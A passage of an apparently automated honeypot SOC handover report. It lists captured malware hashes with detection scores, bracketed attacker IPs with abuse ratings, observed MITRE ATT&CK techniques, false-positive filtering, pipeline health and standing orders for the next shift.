| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a2f3d6d2bd82a65939f4e939bce242e8e246014fb3a9a9d5c3769ed7dcfffe24` | Unknown binary | `a2f3d6d2bd82a659...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `fc6f8ae5f64e4f17481f7e3be29a1c56949f216a998414188003eae1db20c9e5` | GZip Archive | `fc6f8ae5f64e4f17...` | 14/100 | 🟢 LOW | **35/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `167.99.148[.]102` | US | DigitalOcean, LLC | **100** ⚠️ | 0 |
| `3.20.225[.]240` | US | Amazon Technologies Inc. | **100** ⚠️ | 1 |
| `103.172.20[.]218` | ID | PT Vaiotech Lintas Nusantara | **100** ⚠️ | 50 |
| `178.79.182[.]237` | GB | Linode, LLC | **100** ⚠️ | 2 |
| `14.103.113[.]53` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `51.83.40[.]102` | FR | OVH SAS | **100** ⚠️ | 2 |
| `216.70.97[.]74` | US | GoDaddy.com, LLC | **100** ⚠️ | 5 |
| `103.183.62[.]1` | BD | MD SHARJAHAN t/a Hasan Broadband Net | **100** ⚠️ | 50 |
| `135.235.138[.]43` | IN | Microsoft Limited | **100** ⚠️ | 50 |
| `203.168.126[.]136` | JP | Enecom,Inc. | **100** ⚠️ | 4 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 198 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 126 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 57 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 24 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 24 |

---

## 🔕 False Positive Summary (125 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 17 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 122 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 346 cases |
| Tool 34  | Credential Extractor        | ✅ 184 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 11 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 69 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 125 filtered (36.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 43 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 35 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 57 priority case(s) shown individually · 48 recon entry/entries in table (18 group(s) consolidating 134 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-15T12:23:40Z_
